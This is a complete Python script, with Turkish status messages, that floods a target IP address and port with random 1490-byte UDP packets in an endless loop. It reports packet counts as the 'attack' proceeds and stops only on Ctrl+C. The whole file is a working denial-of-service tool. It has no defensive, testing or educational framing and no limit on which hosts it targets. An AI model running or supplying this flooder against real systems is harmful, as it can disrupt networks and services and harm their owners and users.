import sys
import os
import time
import socket
from colorama import Fore
import random

if len(sys.argv) < 3:
    exit()
    
time.sleep(1)
ip = sys.argv[1]
port = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sent = 0
bytes_pack = 0
try:
     while True:
          if port == 65534:
               port = 80
          bytes = random._urandom(1490)
          bytes_pack = bytes_pack + random.randint(0, 1490)
          sock.sendto(bytes, (ip, port))
          sent = sent + 1
          sys.stdout.write(Fore.BLUE + "\r[i]" + Fore.RESET + f' {ip} - Saldırı {port} porta başladı, Paket gönderildi: {sent}, Paket byte: {bytes_pack}/B')
except KeyboardInterrupt:
     print()
     print(Fore.RED+'[-]'+Fore.RESET+' Saldırı durduruldu, [CTRL+C]')
     sys.exit()
